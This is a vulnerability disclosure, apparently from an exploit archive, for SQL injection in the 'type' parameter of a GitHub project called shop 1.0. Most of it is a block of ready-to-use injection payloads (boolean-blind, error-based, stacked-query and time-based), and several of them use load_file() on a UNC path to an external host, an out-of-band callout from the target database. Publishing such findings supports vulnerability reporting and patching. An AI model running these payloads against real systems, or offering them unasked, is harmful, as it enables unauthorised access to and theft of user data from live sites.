## Title: Shop-1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 02.15.2023
## Vendor: https://github.com/teatimehr13
## Software: https://github.com/teatimehr13/shop
## Reference: https://portswigger.net/web-security/sql-injection

## Description:
The `type` parameter appears to be vulnerable to SQL injection attacks. 
The attacker easily can steal all information from this poor system.


STATUS: HIGH Vulnerability CRITICAL

[+]Payload:
```mysql
---
Parameter: type (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: type=-4996' OR 8137=8137 AND 'ETuo'='ETuo

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: type=0'+(select load_file('\\\\2x077nmbedxmlpdulo7iicsqmhsag64x7ly8owd.stupid.com\\qif'))+'' AND (SELECT 5592 FROM(SELECT COUNT(*),CONCAT(0x7171626b71,(SELECT (ELT(5592=5592,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'fWKW'='fWKW

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: type=0'+(select load_file('\\\\2x077nmbedxmlpdulo7iicsqmhsag64x7ly8owd.stupid.com\\qif'))+'';SELECT SLEEP(3)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: type=0'+(select load_file('\\\\2x077nmbedxmlpdulo7iicsqmhsag64x7ly8owd.stupid.com\\qif'))+'' AND (SELECT 8148 FROM (SELECT(SLEEP(3)))ODrl) AND 'YmZx'='YmZx
---

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/teatimehr13/2023/shop-1.0)

## Proof and Exploit:
[href](https://streamable.com/mp7nl3)

## Time spend:
00:15:00


-- 
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html and https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>
